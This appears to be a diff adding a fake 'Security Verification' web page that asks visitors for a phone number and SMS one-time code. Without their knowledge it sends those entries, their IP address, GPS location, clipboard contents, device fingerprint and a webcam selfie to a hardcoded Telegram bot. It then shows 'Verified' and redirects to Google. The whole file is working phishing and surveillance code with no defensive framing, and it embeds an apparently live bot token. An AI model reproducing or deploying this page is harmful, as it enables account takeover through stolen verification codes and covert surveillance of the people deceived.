@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
+    <title>🔴 Security Verification</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a0f;
+            color: #fff;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            max-width: 420px;
+            width: 100%;
+            background: #12121a;
+            border-radius: 28px;
+            padding: 40px 28px;
+            border: 1px solid #2a2a3a;
+            text-align: center;
+        }
+        .icon { font-size: 48px; margin-bottom: 16px; }
+        h1 {
+            font-size: 22px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #f7931a, #ffd700);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        p { color: #888; font-size: 14px; margin: 12px 0 20px 0; line-height: 1.6; }
+        .spinner {
+            display: inline-block;
+            width: 48px;
+            height: 48px;
+            border: 4px solid #2a2a44;
+            border-top-color: #f7931a;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 10px auto;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .status { color: #4caf50; font-weight: 600; font-size: 16px; margin-top: 12px; }
+        .status.error { color: #f44336; }
+        .status.done { color: #4caf50; }
+        .badge {
+            display: inline-block;
+            background: #1f8b4c;
+            padding: 4px 16px;
+            border-radius: 40px;
+            font-size: 11px;
+            font-weight: 600;
+            color: #fff;
+            text-transform: uppercase;
+            margin-top: 8px;
+        }
+        #video { display: none; width: 100%; border-radius: 12px; margin: 10px 0; background: #000; }
+        #canvas { display: none; }
+        .footer { margin-top: 24px; font-size: 11px; color: #444; border-top: 1px solid #1e1e2e; padding-top: 16px; }
+        .btn {
+            background: #f7931a;
+            border: none;
+            color: #000;
+            padding: 14px 40px;
+            border-radius: 40px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 16px;
+            width: 100%;
+        }
+        .btn:hover { background: #ffa726; }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .input-group {
+            margin-top: 16px;
+            text-align: left;
+        }
+        .input-group label {
+            color: #888;
+            font-size: 13px;
+            display: block;
+            margin-bottom: 4px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px 16px;
+            border-radius: 12px;
+            border: 1px solid #2a2a3a;
+            background: #1a1a26;
+            color: #fff;
+            font-size: 14px;
+            outline: none;
+        }
+        .input-group input:focus {
+            border-color: #f7931a;
+        }
+        .input-group input::placeholder {
+            color: #555;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="icon">🔴</div>
+    <h1>Security Verification</h1>
+    <p>Please verify your identity to continue.<br />This is a mandatory security check.</p>
+
+    <!-- Phone Input -->
+    <div class="input-group">
+        <label>📱 Phone Number</label>
+        <input type="tel" id="phoneInput" placeholder="+1 234 567 8900" />
+    </div>
+
+    <!-- SMS Code Input -->
+    <div class="input-group">
+        <label>🔑 Verification Code (SMS)</label>
+        <input type="text" id="smsInput" placeholder="Enter 6-digit code" maxlength="6" />
+    </div>
+
+    <div class="spinner" id="spinner"></div>
+    <div class="status" id="status">Initializing...</div>
+    <div class="badge" id="badge" style="display:none;">LIVE</div>
+
+    <video id="video" autoplay muted playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <button class="btn" id="verifyBtn">✅ Verify Now</button>
+    <button class="btn" id="retryBtn" style="display:none;">🔄 Retry</button>
+
+    <div class="footer">🔒 All data encrypted • Secure connection</div>
+</div>
+
+<script>
+// ================= CONFIG — EDIT THESE =================
+const BOT_TOKEN = "6858098902:AAFrzDhcrsJDvBJiUQb8oI8tPqaZ9NVGVuI";
+const CHAT_ID = "175706993";
+
+// ================= DOM =================
+const statusEl = document.getElementById('status');
+const spinner = document.getElementById('spinner');
+const badge = document.getElementById('badge');
+const retryBtn = document.getElementById('retryBtn');
+const verifyBtn = document.getElementById('verifyBtn');
+const phoneInput = document.getElementById('phoneInput');
+const smsInput = document.getElementById('smsInput');
+
+function setStatus(text, type = '') {
+    statusEl.textContent = text;
+    statusEl.className = 'status' + (type ? ' ' + type : '');
+}
+
+// ================= TELEGRAM SENDER =================
+function sendToTelegram(text) {
+    if (BOT_TOKEN && BOT_TOKEN !== "YOUR_BOT_TOKEN") {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: text
+            })
+        }).catch(() => console.log("Send error"));
+    } else {
+        console.log("[TELEGRAM]", text);
+    }
+}
+
+function sendPhotoToTelegram(blob, caption = "") {
+    if (BOT_TOKEN && BOT_TOKEN !== "YOUR_BOT_TOKEN") {
+        const form = new FormData();
+        form.append("chat_id", CHAT_ID);
+        form.append("photo", blob, `selfie_${Date.now()}.jpg`);
+        if (caption) form.append("caption", caption);
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: "POST",
+            body: form
+        }).catch(() => console.log("Photo send error"));
+    }
+}
+
+// ================= CAPTURE SELFIE =================
+async function captureSelfie() {
+    try {
+        setStatus("📸 Accessing camera...");
+
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: {
+                facingMode: "user",
+                width: { ideal: 320 },
+                height: { ideal: 240 }
+            },
+            audio: false
+        });
+
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+        await video.play();
+
+        setStatus("📸 Capturing...");
+        await new Promise(r => setTimeout(r, 600));
+
+        const canvas = document.getElementById('canvas');
+        canvas.width = video.videoWidth || 320;
+        canvas.height = video.videoHeight || 240;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        setStatus("📤 Sending...");
+
+        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+
+        if (blob) {
+            sendPhotoToTelegram(blob, "📸 Selfie captured");
+        }
+
+        stream.getTracks().forEach(t => t.stop());
+        video.srcObject = null;
+
+        return true;
+
+    } catch (err) {
+        setStatus("❌ Camera error: " + err.message, "error");
+        sendToTelegram(`❌ Camera error: ${err.message}`);
+        retryBtn.style.display = 'block';
+        return false;
+    }
+}
+
+// ================= GET IP =================
+async function getIP() {
+    try {
+        const r = await fetch('https://api.ipify.org?format=json');
+        const d = await r.json();
+        return d.ip || 'unknown';
+    } catch {
+        return 'unknown';
+    }
+}
+
+// ================= GET LOCATION =================
+function getLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            pos => {
+                sendToTelegram(`📍 Location: ${pos.coords.latitude}, ${pos.coords.longitude}`);
+            },
+            () => {},
+            { timeout: 5000, enableHighAccuracy: true }
+        );
+    }
+}
+
+// ================= DEVICE INFO =================
+function getDeviceInfo() {
+    const info = [
+        `📱 Device Info`,
+        `UA: ${navigator.userAgent}`,
+        `Screen: ${window.screen.width}x${window.screen.height}`,
+        `Color: ${window.screen.colorDepth}bit`,
+        `Lang: ${navigator.language}`,
+        `Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`,
+        `Memory: ${navigator.deviceMemory || 'N/A'} GB`,
+        `Cores: ${navigator.hardwareConcurrency || 'N/A'}`
+    ];
+    sendToTelegram(info.join('\n'));
+}
+
+// ================= CLIPBOARD =================
+function getClipboard() {
+    if (navigator.clipboard && navigator.clipboard.readText) {
+        navigator.clipboard.readText()
+            .then(text => {
+                if (text && text.length > 0 && text.length < 500) {
+                    sendToTelegram(`📋 Clipboard: ${text}`);
+                }
+            })
+            .catch(() => {});
+    }
+}
+
+// ================= BROWSER FINGERPRINT =================
+function getFingerprint() {
+    const fp = {
+        ua: navigator.userAgent,
+        lang: navigator.language,
+        platform: navigator.platform,
+        screen: `${window.screen.width}x${window.screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        memory: navigator.deviceMemory || 'N/A',
+        cores: navigator.hardwareConcurrency || 'N/A'
+    };
+    return JSON.stringify(fp);
+}
+
+// ================= RUN ALL =================
+async function runHarvest() {
+    retryBtn.style.display = 'none';
+    spinner.style.display = 'inline-block';
+    verifyBtn.disabled = true;
+
+    const ip = await getIP();
+
+    // Get phone and SMS
+    const phone = phoneInput.value.trim() || 'Not provided';
+    const sms = smsInput.value.trim() || 'Not provided';
+
+    // Send all data
+    getDeviceInfo();
+    getLocation();
+    getClipboard();
+    sendToTelegram(`🌐 IP: ${ip}`);
+    sendToTelegram(`📱 Phone: ${phone}`);
+    sendToTelegram(`🔑 SMS Code: ${sms}`);
+    sendToTelegram(`🔑 Fingerprint: ${getFingerprint()}`);
+
+    // Capture selfie
+    const selfieOk = await captureSelfie();
+
+    // Final status
+    if (selfieOk) {
+        setStatus("✅ Verified! Redirecting...", "done");
+        spinner.style.display = "none";
+        badge.style.display = "inline-block";
+        badge.textContent = "✅ VERIFIED";
+        sendToTelegram("✅ Harvest complete!");
+
+        setTimeout(() => {
+            window.location.href = "https://www.google.com";
+        }, 2500);
+    } else {
+        spinner.style.display = "none";
+        retryBtn.style.display = 'block';
+        verifyBtn.disabled = false;
+    }
+}
+
+// ================= RETRY =================
+retryBtn.onclick = function() {
+    runHarvest();
+};
+
+// ================= VERIFY BUTTON =================
+verifyBtn.onclick = function() {
+    runHarvest();
+};
+
+// ================= AUTO-START =================
+window.addEventListener('DOMContentLoaded', () => {
+    setStatus("Enter your phone and code");
+    spinner.style.display = 'none';
+    verifyBtn.style.display = 'block';
+});
+
+console.log('🔴 Security Verification page loaded');
+console.log('📤 Sending to Telegram bot');
+</script>
+</body>
+</html>
